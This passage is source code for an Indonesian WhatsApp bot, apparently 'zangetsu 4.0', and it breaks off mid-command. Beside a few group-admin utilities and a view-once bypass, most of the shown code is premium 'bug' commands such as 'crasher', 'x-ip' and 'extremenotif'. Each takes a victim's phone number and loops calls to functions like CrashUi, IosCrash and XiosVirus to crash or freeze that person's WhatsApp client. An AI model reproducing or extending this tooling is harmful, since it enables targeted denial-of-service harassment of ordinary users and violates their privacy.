TheFaxz.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'rvo': case 'readvo': {
			if (!isQuotedViewOnce) return TheFaxzReply("Reply view once")
			let type = Object.keys(m.quoted.message)[0]
			let quotedType = m.quoted.message[type]
			let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
			let buffer = Buffer.from([])
			for await (const chunk of media) {
				buffer = Buffer.concat([buffer, chunk])
			}
			if (type == "videoMessage") {
				await TheFaxz.sendMessage(m.chat, {
					video: buffer,
					caption: quotedType.caption
				})
			} else if (type == "imageMessage") {
				await TheFaxz.sendMessage(m.chat, {
					image: buffer,
					caption: quotedType.caption
				})
			}
		}
break
             case "public": {
if (!isOwner) return TheFaxzReply(mess.only.premium)
TheFaxz.public = true
TheFaxzReply("Berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {
if (!isOwner) return TheFaxzReply(mess.only.premium)
TheFaxz.public = false
TheFaxzReply("Berhasil mengganti mode bot menjadi *Self*")
}
break
case "kick": {
if (!isGroup) return TheFaxzReply(mess.only.group)
if (!isAdmins && !isOwner) return TheFaxzReply(mess.only.admin)
if (!isBotAdmins) return TheFaxzReply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await TheFaxz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => TheFaxzReply(util.format(res))).catch((err) => TheFaxzReply(util.format(err)))
}
break
case "linkgc": case "linkgroup":{
if (!isGroup) return TheFaxzReply(mess.only.group)
if (!isAdmins && !isOwner) return TheFaxzReply(mess.only.admin)
if (!isBotAdmins) return TheFaxzReply(mess.only.badmin)
const url = await TheFaxz.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
TheFaxzReply(asu)
}
break
case "owner": {
const repf = await TheFaxz.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
TheFaxz.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Kuh`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "addowner":
if (!isOwner) return TheFaxzReply(mess.only.owner)
if (!args[0]) return TheFaxzReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await TheFaxz.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return TheFaxzReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
TheFaxzReply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return TheFaxzReply(mess.only.owner)
if (!args[0]) return TheFaxzReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
TheFaxzReply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isOwner) return TheFaxzReply(mess.only.owner)
if (!args[0]) return TheFaxzReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await TheFaxz.onWhatsApp(prrkek)
if (ceknya.length == 0) return TheFaxzReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
TheFaxzReply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return TheFaxzReply(mess.only.owner)
if (!args[0]) return TheFaxzReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
TheFaxzReply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case '⚡': {
if (!isPremium && !isOwner) return TheFaxzReply(mess.only.premium)
if (!q) return TheFaxzReply(`Example:\n ${prefix + command} 62xxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
TheFaxzReply(donebug)
await buk1(TheFaxz, target, "Thîs Is ÂlwâysFâxz", 1020000, ptcp = true);
await frezebug(target, dottm)
await beta1(TheFaxz, target, dottm)
await beta2(TheFaxz, target, dottm)
}
break 
                case 'kuil-dengki': case '👋': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`_Example : KuiL-Dengki 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`_Example : KuiL-Dengki 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`*X-Procces🔥*`)
					await TheFaxz.sendMessage(m.chat, { react: { text: `👿`, key: m.key }})
					await TheFaxz.sendMessage(m.chat, {audio: fs.readFileSync('./all/Ex.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 5; i++) {
						await FxZ(X, "☠ *_Zangetsuzehpyh_ Disini* ☠", 1020000, Ptcp = true)
						await ClPmNull(X, null, XnxxFaxzBug, cct = true, ptcp = true)
						await FxZIvS(X, Ptcp = true)
						await FxZ(X, nick.sss, 350000, Ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
						await InVisiXz(X, XnxxFaxzBug, cct = true, ptcp = true)
						await TrashSystem(X, XnxxFaxzBug, Ptcp = true)
						await sleep(5000)
						await ClPm(X, XnxxFaxzBug, cct = true, ptcp = true)
						await InVisiXz(X, XnxxFaxzBug, cct = true, ptcp = true)
						await GlxCall(X, XnxxFaxzBug, cct = true, ptcp = true)
						await InVisiLoc(X, XnxxFaxzBug, Ptcp = true)
						await InVisiLocXz(X, XnxxFaxzBug, Ptcp = true)
						await Gsz(X, FAXZxCRASH)
						await FxZIvS(X, Ptcp = true)
						await FxZIvS(X, Ptcp = true)
						await Tedex(X, dottm)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
						for (let i = 0; i < 2; i++) {
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
				     	}
			     		for (let i = 0; i < 7; i++) {
		 				await FxZxTxOs(X, Ptcp = true)
	         				}
                    			}
                    			TheFaxz.sendMessage(X, {text: `*⟅̊༑ ▾ ⌜ KûîL - Dêngkî ⌟ ▾ ༑̴⟆*`}, {quoted: m})
                    		    	await TheFaxz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
                    		    	await TheFaxz.sendMessage(m.chat, {image: {url: 'https://files.catbox.moe/fdllye.jpg'}, caption: `┌••》 *_\`⌜ メ-zangetsu 4.0 ⌟\`_* 《••►\n┆┆ *[ Succes Bug ]*\n> *›› ↓ X-Target ↓*\n┇➣ ${X}\n┇➣ *Use : ${command}*\n┇ _jeda bug agar tidak kenon_\n┇ *› ©Zangetsuzehpyh*\n└――――――――――――――――►`}, {quoted: m})
      					    	    	}
			                 	    	break
			                 	    	case 'x-ez': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`_Example : X-Ez 62xx_`);
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`_Example : X-Ez 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
					TheFaxzReply(`*X-Procces🔥*`)
					await TheFaxz.sendMessage(m.chat, { react: { text: `👿`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 5; i++) {
		      			await FxZxTxOs(X, Ptcp = true)
						await FxZ(X, "☠ *_AlwaysFaxz_ Disini* ☠", 1020000, Ptcp = true)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
						}
						for (let i = 0; i < 2; i++) {
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
				     	}
			     		for (let i = 0; i < 7; i++) {
		 				await FxZxTxOs(X, Ptcp = true)
		 				await FxZxTxOs(X, Ptcp = true)
		 				await FxZIvS(X, Ptcp = true)
						await TrashSystem(X, XnxxFaxzBug, Ptcp = true)
						await ClPm(X, XnxxFaxzBug, cct = true, ptcp = true)
						await InVisiXz(X, XnxxFaxzBug, cct = true, ptcp = true)
						await sleep(5000)
						await GlxCall(X, XnxxFaxzBug, cct = true, ptcp = true)
						await InVisiLoc(X, XnxxFaxzBug, Ptcp = true)
						await Gsz(X, FAXZxCRASH)
						await Tedex(X, dottm)
						await FxZxTxOs(X, Ptcp = true)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
						await TheFaxz.sendMessage(X, {text: `*⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̊*`}, {quoted: m})
	         				}
                    	
                    		    	await TheFaxz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
                    		    	await TheFaxz.sendMessage(m.chat, {image: {url: thumburl}, caption: `┌••》 *_\`⌜ メ-zangetsu 4.0 ⌟\`_* 《••►\n┆┆ *[ Succes Bug ]*\n> *›› ↓ X-Target ↓*\n┇➣ ${X}\n┇➣ *Use : X-Êz*\n┇ _jeda bug agar tidak kenon_\n┇ *› ©Zangetsuzehpyh*\n└――――――――――――――――►`}, {quoted: m})
      			 	}
			            break
	  case 'crasher': {				
			if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`_Example : Crasher 62xx_`);
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`_Example : Crasher 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
					TheFaxzReply(`*☠X-Crasher☠*`)
					await TheFaxz.sendMessage(m.chat, { react: { text: `👿`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 5; i++) {
		      			await FxZxTxOs(X, Ptcp = true)
						await FxZ(X, "☠ *_Zangetsuzehpyh_ Disini* ☠", 1020000, Ptcp = true)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
		 				await FxZxTxOs(X, Ptcp = true)
		 				await sleep(5000)
		 				await FxZIvS(X, Ptcp = true)
						await TrashSystem(X, XnxxFaxzBug, Ptcp = true)
						await ClPm(X, XnxxFaxzBug, cct = true, ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
						await InVisiXz(X, XnxxFaxzBug, cct = true, ptcp = true)
	         				}
	         				await TheFaxz.sendMessage(X, {text: `*⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̊*`}, {quoted: m})
                    		    	await TheFaxz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
                    		    	await TheFaxz.sendMessage(m.chat, {image: {url: thumburl}, caption: `┌••》 *_\`⌜ メ-zangetsu 4.0 ⌟\`_* 《••►\n┆┆ *[ Succes Bug ]*\n> *›› ↓ X-Target ↓*\n┇➣ ${X}\n┇➣ *Use : Çràshêr*\n┇ _jeda bug agar tidak kenon_\n┇ *› ©Zangetsuzehpyh*\n└――――――――――――――――►`}, {quoted: m})
      					    	    	}
			                 	    	break
			                 	    	case 'explasion': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`_Example : Explasion 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`_Example : Explasion 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`*X-Procces🔥*`)
					await TheFaxz.sendMessage(m.chat, { react: { text: `👿`, key: m.key }})
						await TheFaxz.sendMessage(m.chat, {audio: fs.readFileSync('./all/Ex.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 5; i++) {
						await FxZ(X, "☠ *_Zangetsuzehpyh_ Disini* ☠", 1020000, Ptcp = true)
						await ClPmNull(X, null, XnxxFaxzBug, cct = true, ptcp = true)
						await ClPmNull(X, null, XnxxFaxzBug, cct = true, ptcp = true)
						await FxZIvS(X, Ptcp = true)
						await FxZ(X, nick.sss, 350000, Ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
						await InVisiXz(X, XnxxFaxzBug, cct = true, ptcp = true)
						await TrashSystem(X, XnxxFaxzBug, Ptcp = true)
						await sleep(5000)
						await ClPm(X, XnxxFaxzBug, cct = true, ptcp = true)
						await InVisiXz(X, XnxxFaxzBug, cct = true, ptcp = true)
						await GlxCall(X, XnxxFaxzBug, cct = true, ptcp = true)
						await InVisiLoc(X, XnxxFaxzBug, Ptcp = true)
						await InVisiLocXz(X, XnxxFaxzBug, Ptcp = true)
						await InVisiLocXz(X, XnxxFaxzBug, Ptcp = true)
						await FxZIvS(X, Ptcp = true)
						await Gsz(X, FAXZxCRASH)
						await FxZIvS(X, Ptcp = true)
						await Tedex(X, dottm)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
						for (let i = 0; i < 2; i++) {
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
				     	}
			     		for (let i = 0; i < 7; i++) {
		 				await FxZxTxOs(X, Ptcp = true)
	         				}
                    			}
                    			TheFaxz.sendMessage(X, {text: `*⟅̊༑ ▾ ⌜ Explâsîøn ⌟ ▾ ༑̴⟆*`}, {quoted: m})
                    		    	await TheFaxz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
                    		    	await TheFaxz.sendMessage(m.chat, {image: {url: 'https://files.catbox.moe/1ypqw4.jpg'}, caption: `┌••》 *_\`⌜ メ-zangetsu 4.0 ⌟\`_* 《••►\n┆┆ *[ Succes Bug ]*\n> *›› ↓ X-Target ↓*\n┇➣ ${X}\n┇➣ *Use : Êxpâsiøn*\n┇ _jeda bug agar tidak kenon_\n┇ *› ©Zangetsuzehpyh*\n└――――――――――――――――►`}, {quoted: m})
      					    	    	}
			                 	    	break
                case 'x-ion': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*_Fortmat Salah Contoh -> Xnxxion 628xxx_*`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*_Fortmat Salah Contoh -> Xnxxion 628xxx_*`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await StuckSql(X, XnxxFaxzBug, Ptcp = true)
				}
					}
					break
			case 'glxcall': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await GlxCallX(X, XnxxFaxzBug, cct = true, ptcp = true)
						await GlxCall(X, XnxxFaxzBug, cct = true, ptcp = true)
						await GlxCallX(X, XnxxFaxzBug, cct = true, ptcp = true)
						await GlxCall(X, XnxxFaxzBug, cct = true, ptcp = true)
						await GlxCallX(X, XnxxFaxzBug, cct = true, ptcp = true)
					}
					}
					break
					
			case 'x-vrtx': case '💀': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await TrashSystem(X, XnxxFaxzBug, Ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
						await ClPm(X, XnxxFaxzBug, cct = true, ptcp = true)
						await InVisiXz(X, XnxxFaxzBug, cct = true, ptcp = true)
					}
					}
					break
					
			case 'Xbeta': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 20; i++) {
						await CrashUi(X, null, XnxxFaxzBug, cct = true, ptcp = true)
						await CrashUi(X, null, XnxxFaxzBug, cct = true, ptcp = true)
						await CrashUi(X, null, XnxxFaxzBug, cct = true, ptcp = true)
						await CrashUi(X, null, XnxxFaxzBug, cct = true, ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZ(X, "☠ *_Zangetsuzehpyh_ Disini* ☠", 1020000, Ptcp = true)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
						
					}
					await TheFaxz.sendMessage(X, {text: `*⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̊*`}, {quoted: m})
					}
					break
					
			case 'Hardui': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 6; i++) {
						await CrashUi(X, null, XnxxFaxzBug, cct = true, ptcp = true)
					}
					for (let i = 0; i < 1; i++) {
						await ClPm(X, XnxxFaxzBug, cct = true, ptcp = true)
					}
					}
					break
					
			case 'jext': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await CaroUsel(X)
					}
					}
					break
			case 'overspy': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await GlX(X, Ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
					}
					for (let i = 0; i < 20; i++) {
						await TrashSystem(X, XnxxFaxzBug, Ptcp = true)
					}
					}
					break
				
			case 'olxctrl': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 50; i++) {
						await TrashSystem(X, XnxxFaxzBug, Ptcp = true)
					}
					}
					break
					
			case 'vx': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await GlX(X, Ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
					}
					for (let i = 0; i < 20; i++) {
						await TrashSystem(X, XnxxFaxzBug, Ptcp = true)
					}
					for (let i = 0; i < 1; i++) {
						await ClPm(X, XnxxFaxzBug, cct = true, ptcp = true)
						await InVisiXz(X, XnxxFaxzBug, cct = true, ptcp = true)
					}
					}
					break
					
			
			case 'z-ip': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 200; i++) {
						await IosCrash(X)
						await sleep(1500)
						await IosCrash(X)
						await sleep(1500)
						await IosCrash(X)
						await sleep(1500)
					}
					}
					break
					
			case 'x-ip': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 200; i++) {
						await XiosPay(X)
						await XiosVirus(X)
						await sleep(500)
						await XiosPay(X)
						await XiosVirus(X)
						await sleep(500)
					}
					}
					break
			case 'uzoph': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`);
				
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`*<!>* _Format Salah,Contoh Penggunaan -> ${command} 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				
					TheFaxzReply(`\`[ # ]\` *_X-Attacking . . ._*`)
await TheFaxz.sendMessage(m.chat, { react: { text: `🔥`, key: m.key }})
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await sendCrash(X)
						await sendCrash(X)
						await sendCrash(X)
					}
					}
					break
					case 'extremenotifv2': {				
				if (!isPremium && !isOwner) return TheFaxzReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return TheFaxzReply(`_Example : extremenotifv2 62xx_`);
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return TheFaxzReply(`_Example : extremenotifv2 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				await TheFaxz.sendMessage(m.chat, { react: { text: `☠`, key: m.key }})
					TheFaxzReply(`*☠X-Çràsher☠*`)
					
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 5; i++) {
		      			await FxZxTxOs(X, Ptcp = true)
						await FxZ(X, "☠ *_Zangetsuzehpyh_ Disini* ☠", 1020000, Ptcp = true)
						await FxZ(X, nick.sss, 800000, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
		 				await FxZIvS(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await sendCrash(X)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await StuckNull(X, XnxxFaxzBug, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await TheFaxz.sendMessage(X, {text: `*⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̊*`}, {quoted: m})
						await GlxCall(X, XnxxFaxzBug, cct = true, ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
						await FxZxTxOs(X, Ptcp = true)
	         				}
                    		    	await TheFaxz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
                    		    	await Thezangetsu.sendMessage(m.chat, {image: {url: thumburl}, caption: `┌••》 *_\`⌜ メ-zangetsu 4.0 ⌟\`_* 《••►\n┆┆ *[ Succes Bug ]*\n> *›› ↓ X-Target ↓*\n┇➣ ${X}\n┇➣ *Use : GhøstNøtîfv2*\n┇ _jeda bug agar tidak kenon_\n┇ *› ©Alwayszangetsu*\n└――――――――――――――――►`}, {quoted: m})
      					    	    	}
			                 	    	break
					case 'extremenotif': {				
				if (!isPremium && !isOwner) return ThezangetsuReply(`\`[ # ]\` _Khusus Premium User & Owner Boss,Lu Siapa Jangan Sokap_`)
				if (!q) return ThezangetsuReply(`_Example : extremenotif 62xx_`);
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return ThezangetsuReply(`_Example : extremenotif 62xx_`)
				let X = incTarget + '@s.whatsapp.net';
				await Thezangetsu.sendMessage(m.chat, { react: { text: `☠`, key: m.key }})
					ThezangetsuReply(`*zangetsu*`)
					
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 5; i++) {
